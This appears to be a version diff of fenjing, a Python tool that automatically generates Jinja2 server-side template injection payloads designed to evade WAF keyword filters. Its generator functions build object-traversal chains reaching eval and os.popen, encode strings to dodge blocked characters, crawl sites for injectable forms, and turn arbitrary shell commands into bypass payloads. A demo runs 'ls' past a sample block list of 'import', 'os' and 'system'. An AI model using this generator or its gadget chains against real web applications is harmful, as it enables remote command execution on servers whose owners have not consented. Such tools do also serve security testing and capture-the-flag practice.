 def gen_string_percent_lower_c_literal1(context):
-    return [
-        (LITERAL, "'%c'")
-    ]
+    return [(LITERAL, "'%c'")]
 
 
 @req_gen
 def gen_string_percent_lower_c_literal2(context):
-    return [
-        (LITERAL, '"%c"')
-    ]
+    return [(LITERAL, '"%c"')]
 
 
 @req_gen
 def gen_string_percent_lower_c_concat(context):
     return [
         (LITERAL, "("),
-        (STRING_PERCENT, ),
-        (STRING_STRING_CONCNAT, ),
-        (STRING_LOWERC, ),
+        (STRING_PERCENT,),
+        (STRING_STRING_CONCNAT,),
+        (STRING_LOWERC,),
         (LITERAL, ")"),
     ]
 
 
 @req_gen
 def gen_string_percent_lower_c_cycler(context):
     # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
     return [
         (LITERAL, "(cycler|pprint|list|pprint|urlencode|batch("),
         (INTEGER, 10),
         (LITERAL, ")|first|join|batch("),
         (INTEGER, 8),
-        (LITERAL, ")|list|last|reverse|join|lower)")
+        (LITERAL, ")|list|last|reverse|join|lower)"),
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_string_many_percent_lower_c_multiply(context, count: int):
-    return [
-        (STRING_PERCENT_LOWER_C, ),
-        (LITERAL, "*"),
-        (INTEGER, count)
-    ]
+    return [(STRING_PERCENT_LOWER_C,), (LITERAL, "*"), (INTEGER, count)]
 
 
 @req_gen
 def gen_string_many_percent_lower_c_concat(context, count: int):
-
     l = [
-        [(STRING_PERCENT_LOWER_C, ), ] if i == 0 else [
-            (STRING_STRING_CONCNAT, ), (STRING_PERCENT_LOWER_C, ), ]
+        [
+            (STRING_PERCENT_LOWER_C,),
+        ]
+        if i == 0
+        else [
+            (STRING_STRING_CONCNAT,),
+            (STRING_PERCENT_LOWER_C,),
+        ]
         for i in range(count)
     ]
     return [item for lst in l for item in lst]
 
 
 # ---
 
+
 @req_gen
 def gen_string_underline_literal1(context):
-    return [
-        (LITERAL, "'_'")
-    ]
+    return [(LITERAL, "'_'")]
 
 
 @req_gen
 def gen_string_underline_literal2(context):
-    return [
-        (LITERAL, '"_"')
-    ]
+    return [(LITERAL, '"_"')]
 
 
 @req_gen
 def gen_string_underline_context(context: dict):
     if "_" in context.values():
         v = [k for k, v in context.items() if v == "_"][0]
-        return [
-            (LITERAL, v)
-        ] + [
-            (WITH_CONTEXT_VAR, v)
-        ]
-    return [
-        (UNSATISFIED, )
-    ]
+        return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
+    return [(UNSATISFIED,)]
 
 
 @req_gen
 def gen_string_underline_lipsum(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
         (INTEGER, 22),
-        (LITERAL, ")|list|first|last)")
+        (LITERAL, ")|list|first|last)"),
     ]
 
 
 @req_gen
 def gen_string_underline_tupleselect(context):
     return [
         (LITERAL, "(()|select|string|batch("),
         (INTEGER, 25),
-        (LITERAL, ")|first|last)")
+        (LITERAL, ")|first|last)"),
     ]
 
+
 @req_gen
 def gen_string_many_format_c_complex(context, num):
     parts = "(({c})*{l})".format(
         c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,LOWERC)",
-        l=num
+        l=num,
     ).partition("LOWERC")
-    return [
-        (LITERAL, parts[0]),
-        (STRING_LOWERC, ),
-        (LITERAL, parts[2])
-    ]
+    return [(LITERAL, parts[0]), (STRING_LOWERC,), (LITERAL, parts[2])]
+
 
 # ---
 
+
 @req_gen
 def gen_char_literal1(context, c):
-    return [
-        (LITERAL, f"'{c}'" if c != "'" else "'\\''")
-    ]
+    return [(LITERAL, f"'{c}'" if c != "'" else "'\\''")]
+
 
 @req_gen
 def gen_char_literal2(context, c):
-    return [
-        (LITERAL, f'"{c}"' if c != '"' else '"\\""')
-    ]
+    return [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]
+
 
 @req_gen
 def gen_char_select(context, c):
     char_patterns = {
         "((dict|trim|list)[INDEX])": {
-            1: "c", 2: "l", 3: "a", 4: "s", 5: "s", 6: " ", 8: "d", 9: "i", 10: "c", 11: "t"
+            1: "c",
+            2: "l",
+            3: "a",
+            4: "s",
+            5: "s",
+            6: " ",
+            8: "d",
+            9: "i",
+            10: "c",
+            11: "t",
         },
         "(({}|select()|trim|list)[INDEX])": {
-            1: "g", 2: "e", 3: "n", 4: "e", 5: "r", 6: "a", 7: "t", 8: "o", 9: "r", 10: " ", 
-            11: "o", 12: "b", 13: "j", 14: "e", 15: "c", 16: "t", 17: " ", 18: "s", 19: "e", 20: 
-            "l", 21: "e", 22: "c", 23: "t", 24: "_", 25: "o", 26: "r", 27: "_", 28: "r", 29: "e", 30: "j", 
-            31: "e", 32: "c", 33: "t", 34: " ", 35: "a", 36: "t"
+            1: "g",
+            2: "e",
+            3: "n",
+            4: "e",
+            5: "r",
+            6: "a",
+            7: "t",
+            8: "o",
+            9: "r",
+            10: " ",
+            11: "o",
+            12: "b",
+            13: "j",
+            14: "e",
+            15: "c",
+            16: "t",
+            17: " ",
+            18: "s",
+            19: "e",
+            20: "l",
+            21: "e",
+            22: "c",
+            23: "t",
+            24: "_",
+            25: "o",
+            26: "r",
+            27: "_",
+            28: "r",
+            29: "e",
+            30: "j",
+            31: "e",
+            32: "c",
+            33: "t",
+            34: " ",
+            35: "a",
+            36: "t",
         },
         "((lipsum|trim|list)[INDEX])": {
-            1: "f", 2: "u", 3: "n", 4: "c", 5: "t", 6: "i", 7: "o", 8: "n", 9: " ", 10: "g", 
-            11: "e", 12: "n", 13: "e", 14: "r", 15: "a", 16: "t", 17: "e", 18: "_", 19: "l", 20: "o", 
-            21: "r", 22: "e", 23: "m", 24: "_", 25: "i", 26: "p", 27: "s", 28: "u", 29: "m", 30: " ", 
-            31: "a", 32: "t", 33: " ", 34: "0", 35: "x", 36: "7"
+            1: "f",
+            2: "u",
+            3: "n",
+            4: "c",
+            5: "t",
+            6: "i",
+            7: "o",
+            8: "n",
+            9: " ",
+            10: "g",
+            11: "e",
+            12: "n",
+            13: "e",
+            14: "r",
+            15: "a",
+            16: "t",
+            17: "e",
+            18: "_",
+            19: "l",
+            20: "o",
+            21: "r",
+            22: "e",
+            23: "m",
+            24: "_",
+            25: "i",
+            26: "p",
+            27: "s",
+            28: "u",
+            29: "m",
+            30: " ",
+            31: "a",
+            32: "t",
+            33: " ",
+            34: "0",
+            35: "x",
+            36: "7",
         },
-        "((()|trim|list)[INDEX])": {0: '(', 1: ')'},
+        "((()|trim|list)[INDEX])": {0: "(", 1: ")"},
     }
     for pattern, d in char_patterns.items():
         for index, value in d.items():
             if value == c:
-                return [
-                    (LITERAL, pattern.replace("INDEX", str(index)))
-                ]
-    return [
-        (UNSATISFIED, )
-    ]
+                return [(LITERAL, pattern.replace("INDEX", str(index)))]
+    return [(UNSATISFIED,)]
+
 
 @req_gen
 def gen_char_dict(context, c):
     if not re.match("[0-9A-Za-z]", c):
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (LITERAL, f"(dict({c}=x)|join)")
-    ]
+        return [(UNSATISFIED,)]
+    return [(LITERAL, f"(dict({c}=x)|join)")]
+
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
+
 @req_gen
 def gen_string_1(context: dict, value: str):
-    chars = [c if c != "\'" else "\\\'" for c in value]
-    return [
-        (LITERAL, "'{}'".format("".join(chars)))
-    ]
+    chars = [c if c != "'" else "\\'" for c in value]
+    return [(LITERAL, "'{}'".format("".join(chars)))]
 
 
 @req_gen
 def gen_string_2(context: dict, value: str):
-    chars = [c if c != "\"" else "\\\"" for c in value]
-    return [
-        (LITERAL, '"{}"'.format("".join(chars)))
-    ]
+    chars = [c if c != '"' else '\\"' for c in value]
+    return [(LITERAL, '"{}"'.format("".join(chars)))]
 
 
 @req_gen
 def gen_string_x1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     target = "".join("\\x" + hex(ord(c))[2:] for c in value)
-    return [
-        (LITERAL, '"{}"'.format(target))
-    ]
+    return [(LITERAL, '"{}"'.format(target))]
 
 
 @req_gen
 def gen_string_x2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     target = "".join("\\x" + hex(ord(c))[2:] for c in value)
-    return [
-        (LITERAL, "'{}'".format(target))
-    ]
+    return [(LITERAL, "'{}'".format(target))]
 
 
 @req_gen
 def gen_string_u1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
-    return [
-        (LITERAL, "'{}'".format(target))
-    ]
+    return [(LITERAL, "'{}'".format(target))]
 
 
 @req_gen
 def gen_string_u2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
-    return [
-        (LITERAL, "'{}'".format(target))
-    ]
+    return [(LITERAL, "'{}'".format(target))]
 
 
 @req_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == value][0]
-    return [
-        (LITERAL, v)
-    ] + [
-        (WITH_CONTEXT_VAR, v)
-    ]
+    return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
 @req_gen
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
-        (STRING_UNDERLINE, ),
+        (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
-        (STRING_STRING_CONCNAT, ),
+        (STRING_STRING_CONCNAT,),
         (STRING, value[2:-2]),
-        (STRING_STRING_CONCNAT, ),
-        (STRING_UNDERLINE, ),
+        (STRING_STRING_CONCNAT,),
+        (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
     ]
 
 
 @req_gen
 def gen_string_concat1(context: dict, value: str):
     return [
-        (LITERAL, "({})".format(
-            "+".join("'{}'".format(c if c != "'" else "\\'") for c in value)
-        ))
+        (
+            LITERAL,
+            "({})".format(
+                "+".join("'{}'".format(c if c != "'" else "\\'") for c in value)
+            ),
+        )
     ]
 
 
 @req_gen
 def gen_string_concat2(context: dict, value: str):
     return [
-        (LITERAL, "({})".format(
-            "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
-        ))
+        (
+            LITERAL,
+            "({})".format(
+                "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
+            ),
+        )
     ]
 
 
 @req_gen
 def gen_string_concat3(context: dict, value: str):
     return [
-        (LITERAL, "({})".format(
-            "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
-        ))
+        (
+            LITERAL,
+            "({})".format(
+                "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
+            ),
+        )
     ]
 
 
 @req_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (LITERAL, "(dict({}=x)|join)".format(value))
-    ]
+        return [(UNSATISFIED,)]
+    return [(LITERAL, "(dict({}=x)|join)".format(value))]
 
 
 @req_gen
 def gen_string_splitdictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
-        return [
-            (UNSATISFIED, )
-        ]
-    parts = [
-        value[i:i+3] for i in range(0, len(value), 3)
-    ]
+        return [(UNSATISFIED,)]
+    parts = [value[i : i + 3] for i in range(0, len(value), 3)]
     req = []
     for i, part in enumerate(parts):
         if i != 0:
-            req.append((STRING_STRING_CONCNAT, ))
+            req.append((STRING_STRING_CONCNAT,))
         req.append((LITERAL, "(dict({}=x)|join)".format(part)))
     return req
 
 
 @req_gen
 def gen_string_splitdictjoin2(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
-        return [
-            (UNSATISFIED, )
-        ]
-    parts = [
-        value[i:i+3] for i in range(0, len(value), 3)
-    ]
+        return [(UNSATISFIED,)]
+    parts = [value[i : i + 3] for i in range(0, len(value), 3)]
 
     if len(set(parts)) != len(parts):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in parts)))
     ]
 
 
 @req_gen
 def gen_string_splitdictjoin3(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     if len(set(value)) != len(value):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
     ]
 
+
 @req_gen
 def gen_string_chars(context: dict, value: str):
-    ans: List[Any] = [
-        (LITERAL, "("),
-        (CHAR, value[0])
-    ]
+    ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
     for c in value[1:]:
-        ans.append(
-            (STRING_STRING_CONCNAT, )
-        )
-        ans.append(
-            (CHAR, c)
-        )
+        ans.append((STRING_STRING_CONCNAT,))
+        ans.append((CHAR, c))
     ans.append(
         (LITERAL, ")"),
     )
     return ans
 
 
 @req_gen
 def gen_string_formatpercent(context: dict, value: str):
     # (('%c'*n)%(97,98,99))
     req = []
-    req.append(
-        (LITERAL, "((")
-    )
-    req.append(
-        (STRING_MANY_PERCENT_LOWER_C, len(value))
-    )
-    req.append(
-        (LITERAL, ")%(")
-    )
+    req.append((LITERAL, "(("))
+    req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
+    req.append((LITERAL, ")%("))
     for i, c in enumerate(value):
         if i != 0:
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
-    req.append(
-        (LITERAL, "))")
-    )
+    req.append((LITERAL, "))"))
     return req
 
 
 @req_gen
 def gen_string_formatfunc(context: dict, value: str):
     # (('%c'*n)|format(97,98,99))
     req = []
-    req.append(
-        (LITERAL, "((")
-    )
-    req.append(
-        (STRING_MANY_PERCENT_LOWER_C, len(value))
-    )
-    req.append(
-        (LITERAL, ")|format(")
-    )
+    req.append((LITERAL, "(("))
+    req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
+    req.append((LITERAL, ")|format("))
     for i, c in enumerate(value):
         if i != 0:
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
-    req.append(
-        (LITERAL, "))")
-    )
+    req.append((LITERAL, "))"))
     return req
 
 
 @req_gen
 def gen_string_formatfunc2(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
-    if re.match("^[a-z]+$", value): # avoid infinite recursion
-        return [
-            (UNSATISFIED, )
-        ]
+    if re.match("^[a-z]+$", value):  # avoid infinite recursion
+        return [(UNSATISFIED,)]
     if "{:c}" not in context.values():
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     k = [k for k, v in context.values() if v == "{:c}"][0]
-    cs = "({c}*{l})".format(
-        c=k,
-        l=len(value)
-    )
+    cs = "({c}*{l})".format(c=k, l=len(value))
     format_func = (ATTRIBUTE, (LITERAL, cs), "format")
     req = [
         (LITERAL, "("),
         format_func,
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
-        (LITERAL, "))")
-    ] + [
-        (WITH_CONTEXT_VAR, k)
-    ]
+        (LITERAL, "))"),
+    ] + [(WITH_CONTEXT_VAR, k)]
     return req
 
 
 @req_gen
 def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
-    if re.match("^[a-z]+$", value): # avoid infinite recursion
-        return [
-            (UNSATISFIED, )
-        ]
+    if re.match("^[a-z]+$", value):  # avoid infinite recursion
+        return [(UNSATISFIED,)]
     # cs = "(({c})*{l})".format(
     #     c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=x)|join)",
     #     l=len(value)
     # )
     format_func = (ATTRIBUTE, (STRING_MANY_FORMAT_C, len(value)), "format")
     req = [
         (LITERAL, "("),
         format_func,
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
-        (LITERAL, "))")
+        (LITERAL, "))"),
     ]
     return req
 
+
 # ---
 
 
 @req_gen
 def gen_attribute_normal1(context, obj_req, attr_name):
     if not re.match("[A-Za-z_][A-Za-z0-9_]+", attr_name):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
         (LITERAL, "("),
         obj_req,
         (LITERAL, "."),
         (LITERAL, attr_name),
         (LITERAL, ")"),
     ]
@@ -1091,23 +1024,22 @@
         (LITERAL, "("),
         obj_req,
         (LITERAL, "|attr("),
         (STRING, attr_name),
         (LITERAL, "))"),
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_item_normal1(context, obj_req, item_name):
     if not re.match("[A-Za-z_][A-Za-z0-9_]+", item_name):
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
         (LITERAL, "("),
         obj_req,
         (LITERAL, "."),
         (LITERAL, item_name),
         (LITERAL, ")"),
     ]
@@ -1130,27 +1062,28 @@
         (LITERAL, "("),
         (ATTRIBUTE, obj_req, "__getitem__"),
         (LITERAL, "("),
         (STRING, item_name),
         (LITERAL, "))"),
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_class_attribute_literal(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
         (
             ATTRIBUTE,
             obj_req,
             "__class__",
         ),
-        (LITERAL, "." + attr_name)
+        (LITERAL, "." + attr_name),
     ]
 
 
 @req_gen
 def gen_class_attribute_attrfilter(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
@@ -1160,21 +1093,25 @@
             obj_req,
             "__class__",
         ),
         (LITERAL, "|attr("),
         (STRING, attr_name),
         (LITERAL, "))"),
     ]
+
+
 # ---
 
 
 @req_gen
 def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
     if not attr_item_req:
-        return [obj_req,]
+        return [
+            obj_req,
+        ]
     first_req, *other_req = attr_item_req
     req_type, req_name = first_req
     got_req = (
         req_type,
         obj_req,
         req_name,
     )
@@ -1182,41 +1119,47 @@
         (
             CHAINED_ATTRIBUTE_ITEM,
             got_req,
             *other_req,
         ),
     ]
 
+
 # ---
 
 
 # ---
 
 
 @req_gen
 def gen_eval_func_lipsum(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "lipsum"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "lipsum"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
 
 
 @req_gen
 def gen_eval_func_joiner(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "joiner"),
-        (ATTRIBUTE, "__init__"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "joiner"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
 
 # @req_gen
 # def gen_eval_func_x(context):
 #     return [(
 #         CHAINED_ATTRIBUTE_ITEM,
 #         (LITERAL, "x"),
 #         (ATTRIBUTE, "__init__"),
@@ -1228,28 +1171,27 @@
 # ---
 
 
 @req_gen
 def gen_eval_normal(context, code):
     return [
         (LITERAL, "("),
-        (EVAL_FUNC, ),
+        (EVAL_FUNC,),
         (LITERAL, "("),
         (STRING, code),
-        (LITERAL, "))")
+        (LITERAL, "))"),
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_config_literal(context):
-    return [
-        (LITERAL, "config")
-    ]
+    return [(LITERAL, "config")]
 
 
 @req_gen
 def gen_config_self(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
@@ -1274,61 +1216,57 @@
             (ATTRIBUTE, "default"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "current_app"),
             (ATTRIBUTE, "config"),
         )
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_module_os_urlfor(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "url_for"),
             (ATTRIBUTE, "__globals__"),
-            (ITEM, "os")
+            (ITEM, "os"),
         )
     ]
 
 
 @req_gen
 def gen_module_os_config(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
-            (CONFIG, ),
+            (CONFIG,),
             (CLASS_ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "os"),
         )
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_os_popen_obj_eval(context, cmd):
     cmd = cmd.replace("'", "\\'")
-    return [
-        (EVAL, "__import__('os').popen('" + cmd + "')")
-    ]
+    return [(EVAL, "__import__('os').popen('" + cmd + "')")]
 
 
 @req_gen
 def gen_os_popen_obj_normal(context, cmd):
     return [
         (LITERAL, "("),
-        (
-            ATTRIBUTE,
-            (MODULE_OS, ),
-            "popen"
-        ),
+        (ATTRIBUTE, (MODULE_OS,), "popen"),
         (LITERAL, "("),
         (STRING, cmd),
         (LITERAL, "))"),
     ]
 
 
 # ---
@@ -1346,16 +1284,32 @@
 if __name__ == "__main__":
     import time
     import functools
 
     @functools.lru_cache(100)
     def waf_func(payload: str):
         time.sleep(0.2)
-        return all(word not in payload for word in ['\'', '"', '.', '_', 'import', 'request', 'url', '\\x', 'os', 'system', '\\u', '22'])
+        return all(
+            word not in payload
+            for word in [
+                "'",
+                '"',
+                ".",
+                "_",
+                "import",
+                "request",
+                "url",
+                "\\x",
+                "os",
+                "system",
+                "\\u",
+                "22",
+            ]
+        )
 
     payload = generate(
         OS_POPEN_READ,
         "ls",
         waf_func=waf_func,
-        context={"loo": 100, "lo": 10, "l": 1, "un": "_"}
+        context={"loo": 100, "lo": 10, "l": 1, "un": "_"},
     )
     print(payload)
```

### Comparing `fenjing-0.4.2/fenjing/requester.py` & `fenjing-0.4.3/fenjing/requester.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,57 +1,77 @@
-import requests
+"""实际发出网络请求并返回响应
+"""
+
 import logging
 import traceback
 import time
+
+import requests
+
+
 from .const import DEFAULT_USER_AGENT
 
 logger = logging.getLogger("requester")
 
 
 class Requester:
+    """实际发送HTTP请求的类"""
+
     def __init__(
         self,
         interval=0.0,
         timeout=10,
         retry_times=5,
         retry_interval=1,
-        retry_status=(429, ),
+        retry_status=(429,),
         user_agent=DEFAULT_USER_AGENT,
-        headers={},
+        headers=None,
     ):
         self.interval = interval
         self.timeout = timeout
         self.retry_times = retry_times
         self.retry_interval = retry_interval
         self.retry_status = retry_status
         self.session = requests.Session()
         self.session.headers.update({"User-Agent": user_agent})
         self.last_request_time = 0
 
         if headers:
             self.session.headers.update(headers)
 
     def request_once(self, **kwargs):
+        """发出一次网络请求，失败时返回None
+
+        Returns:
+            Response | None: 返回的响应
+        """
         duration = time.perf_counter() - self.last_request_time
         if duration < self.interval:
             time.sleep(self.interval - duration)
 
         if "timeout" not in kwargs:
             kwargs["timeout"] = self.timeout
         try:
-            r = self.session.request(**kwargs)
-        except Exception as e:
-            logging.warning(f"Exception found when requesting: {type(e)}")
+            resp = self.session.request(**kwargs)
+        except Exception as exception:  # pylint: disable=W0718
+            logging.warning(
+                "Exception found when requesting: %s", type(exception)
+            )
             logging.debug(traceback.format_exc())
             return None
-        if r.status_code in self.retry_status:
+        if resp.status_code in self.retry_status:
             return None
 
         self.last_request_time = time.perf_counter()
-        return r
+        return resp
 
     def request(self, **kwargs):
-        for i in range(self.retry_times - 1):
-            r = self.request_once(**kwargs)
-            if r:
-                return r
+        """发送请求，自动重试
+
+        Returns:
+            Response | None: 响应
+        """
+        for _ in range(self.retry_times - 1):
+            resp = self.request_once(**kwargs)
+            if resp:
+                return resp
         return self.request_once(**kwargs)
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `fenjing-0.4.2/fenjing/scan_url.py` & `fenjing-0.4.3/fenjing/scan_url.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,11 +1,15 @@
-import logging
-from typing import Union
-from .form import parse_forms
+"""扫描指定的网站并返回所有表格
+
+"""
 
+import logging
+from typing import Union, Generator, Tuple, List
+from .form import parse_forms, Form
+from .requester import Requester
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("scan_url")
 
 
 def parse_urls(html: Union[str, BeautifulSoup]) -> list:
     """从html中解析出所有的链接
@@ -13,32 +17,53 @@
     Args:
         html (str|BeautifulSoup): HTML
 
     Returns:
         List[str]: 所有链接
     """
     if isinstance(html, str):
-        bs = BeautifulSoup(html, "html.parser")
+        bs_obj = BeautifulSoup(html, "html.parser")
     elif isinstance(html, BeautifulSoup):
-        bs = html
+        bs_obj = html
+
+    return [
+        element.attrs["href"]
+        for element in bs_obj.select("a")
+        if "href" in element
+    ]
 
-    return [element.attrs["href"] for element in bs.select("a") if "href" in element]
 
+def yield_form(
+    requester: Requester, start_url: str
+) -> Generator[Tuple[str, List[Form]], None, None]:
+    """根据起始URL扫描出所有的表格
 
-def yield_form(requester, start_url):
+    Args:
+        requester (Requester): HTTP工具类Requester
+        start_url (str): 起始URL
+
+    Yields:
+        Generator[Tuple[str, List[Form]], None, None]:
+            所有URL与其中的表格
+    """
     found = False
-    targets = [start_url, ]
+    targets = [
+        start_url,
+    ]
     visited = set()
     while targets:
         target_url = targets.pop(0)
         if target_url in visited:
             continue
         visited.add(target_url)
 
         resp = requester.request(method="GET", url=target_url)
+        if resp is None:
+            logger.warning("Fetch URL %s failed!", target_url)
+            continue
         html = BeautifulSoup(resp.text, "html.parser")
         forms = parse_forms(target_url, html)
 
         if forms:
             yield target_url, forms
             found = True
         targets += parse_urls(html)
```

### Comparing `fenjing-0.4.2/fenjing/shell_payload.py` & `fenjing-0.4.3/fenjing/shell_payload.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,14 +1,26 @@
+"""生成执行Shell指令的payload
+"""
+
 from typing import Callable, Tuple, Dict, Union
 from .const import OS_POPEN_READ
 from .full_payload_gen import FullPayloadGen
 
 full_payload_store: Dict[int, FullPayloadGen] = {}
 
-def exec_cmd_payload(waf_func: Callable[[str, ], bool], cmd: str) -> Tuple[Union[str, None], Union[bool, None]]:
+
+def exec_cmd_payload(
+    waf_func: Callable[
+        [
+            str,
+        ],
+        bool,
+    ],
+    cmd: str,
+) -> Tuple[Union[str, None], Union[bool, None]]:
     """根据提供的waf函数为一个shell命令生成对应的payload
 
     Args:
         waf_func (Callable[[str, ], bool]): waf函数，判断提供的payload能否通过waf, 能则返回True
         cmd (str): 需要执行的shell命令
 
     Returns:
@@ -17,8 +29,7 @@
     full_payload = None
     if id(waf_func) not in full_payload_store:
         full_payload = FullPayloadGen(waf_func)
         full_payload_store[id(waf_func)] = full_payload
     else:
         full_payload = full_payload_store[id(waf_func)]
     return full_payload.generate(OS_POPEN_READ, cmd)
-
```

### Comparing `fenjing-0.4.2/fenjing/templates/index.html` & `fenjing-0.4.3/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.2/fenjing/webui.py` & `fenjing-0.4.3/fenjing/webui.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,92 +1,100 @@
+# pylint: skip-file
+# flake8: noqa
 from flask import Flask, render_template, request, jsonify
 
 import logging
 import threading
 import uuid
 from urllib.parse import urlparse
 
-from .form import Form
+from .form import get_form
 from .form_cracker import FormCracker
 from .requester import Requester
-from .const import *
+from .const import (
+    CALLBACK_GENERATE_FULLPAYLOAD,
+    CALLBACK_GENERATE_PAYLOAD,
+    CALLBACK_PREPARE_FULLPAYLOADGEN,
+    CALLBACK_SUBMIT,
+    CALLBACK_TEST_FORM_INPUT,
+    APICODE_OK,
+    APICODE_WRONG_INPUT,
+    DEFAULT_USER_AGENT,
+    OS_POPEN_READ
+)
 
 logger = logging.getLogger("webui")
 app = Flask(__name__)
 tasks = {}
 
 
 class CallBackLogger:
     def __init__(self, flash_messages, messages):
         self.flash_messages = flash_messages
         self.messages = messages
 
     def callback_prepare_fullpayloadgen(self, data):
-        self.messages.append(
-            f"上下文payload测试完毕。"
-        )
+        self.messages.append("上下文payload测试完毕。")
         if data["context"]:
-            context_repr = ', '.join(f"{k}={repr(v)}"
-                                     for k, v in data['context'].items())
-            self.messages.append(
-                f"以下是在上下文中的值：{context_repr}"
+            context_repr = ", ".join(
+                f"{k}={repr(v)}" for k, v in data["context"].items()
             )
+            self.messages.append(f"以下是在上下文中的值：{context_repr}")
         else:
-            self.messages.append(
-                f"没有上下文payload可以通过waf。。。"
-            )
+            self.messages.append(f"没有上下文payload可以通过waf。。。")
         if not data["will_print"]:
-            self.messages.append(
-                f"生成的payload将不会具有回显。"
-            )
+            self.messages.append(f"生成的payload将不会具有回显。")
 
     def callback_generate_fullpayload(self, data):
-        payload = data['payload'] if len(data['payload']) < 30 else data['payload'][:30] + "..."
+        payload = (
+            data["payload"]
+            if len(data["payload"]) < 30
+            else data["payload"][:30] + "..."
+        )
         self.messages.append(
